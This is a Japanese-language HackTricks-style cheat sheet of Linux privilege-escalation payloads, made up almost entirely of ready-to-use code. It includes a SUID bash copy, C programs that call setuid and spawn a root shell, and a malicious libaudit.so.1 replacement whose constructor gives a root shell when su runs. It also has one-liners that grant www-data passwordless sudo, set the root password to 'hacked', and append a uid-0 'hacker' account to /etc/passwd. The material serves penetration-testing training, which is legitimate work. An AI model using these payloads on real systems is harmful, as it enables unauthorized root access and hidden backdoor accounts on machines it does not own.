# 実行するペイロード

{{#include ../../banners/hacktricks-training.md}}

## Bash
```bash
cp /bin/bash /tmp/b && chmod +s /tmp/b
/bin/b -p #Maintains root privileges from suid, working in debian & buntu
```
## C
```c
//gcc payload.c -o payload
int main(void){
setresuid(0, 0, 0); //Set as user suid user
system("/bin/sh");
return 0;
}
```

```c
//gcc payload.c -o payload
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main(){
setuid(getuid());
system("/bin/bash");
return 0;
}
```

```c
// Privesc to user id: 1000
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
char *const paramList[10] = {"/bin/bash", "-p", NULL};
const int id = 1000;
setresuid(id, id, id);
execve(paramList[0], paramList, NULL);
return 0;
}
```
## 権限昇格のためのファイルの上書き

### 一般的なファイル

- _/etc/passwd_ にパスワード付きのユーザーを追加
- _/etc/shadow_ 内のパスワードを変更
- _/etc/sudoers_ にユーザーを追加
- 通常 _/run/docker.sock_ または _/var/run/docker.sock_ にあるdockerソケットを通じてdockerを悪用

### ライブラリの上書き

バイナリによって使用されるライブラリを確認します。この場合は `/bin/su`:
```bash
ldd /bin/su
linux-vdso.so.1 (0x00007ffef06e9000)
libpam.so.0 => /lib/x86_64-linux-gnu/libpam.so.0 (0x00007fe473676000)
libpam_misc.so.0 => /lib/x86_64-linux-gnu/libpam_misc.so.0 (0x00007fe473472000)
libaudit.so.1 => /lib/x86_64-linux-gnu/libaudit.so.1 (0x00007fe473249000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe472e58000)
libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe472c54000)
libcap-ng.so.0 => /lib/x86_64-linux-gnu/libcap-ng.so.0 (0x00007fe472a4f000)
/lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
```
この場合、`/lib/x86_64-linux-gnu/libaudit.so.1`を偽装してみましょう。\
したがって、**`su`**バイナリによって使用されるこのライブラリの関数を確認します：
```bash
objdump -T /bin/su | grep audit
0000000000000000      DF *UND*  0000000000000000              audit_open
0000000000000000      DF *UND*  0000000000000000              audit_log_user_message
0000000000000000      DF *UND*  0000000000000000              audit_log_acct_message
000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
```
シンボル `audit_open`、`audit_log_acct_message`、`audit_log_acct_message` および `audit_fd` は、おそらく libaudit.so.1 ライブラリからのものです。libaudit.so.1 は悪意のある共有ライブラリによって上書きされるため、これらのシンボルは新しい共有ライブラリに存在する必要があります。そうでなければ、プログラムはシンボルを見つけることができず、終了します。
```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

//gcc -shared -o /lib/x86_64-linux-gnu/libaudit.so.1 -fPIC inject.c

int audit_open;
int audit_log_acct_message;
int audit_log_user_message;
int audit_fd;

void inject()__attribute__((constructor));

void inject()
{
setuid(0);
setgid(0);
system("/bin/bash");
}
```
今、単に **`/bin/su`** を呼び出すことで、rootとしてシェルを取得できます。

## スクリプト

rootに何かを実行させることはできますか？

### **www-dataをsudoersに追加**
```bash
echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
```
### **ルートパスワードの変更**
```bash
echo "root:hacked" | chpasswd
```
### /etc/passwd に新しい root ユーザーを追加する
```bash
echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
```
{{#include ../../banners/hacktricks-training.md}}
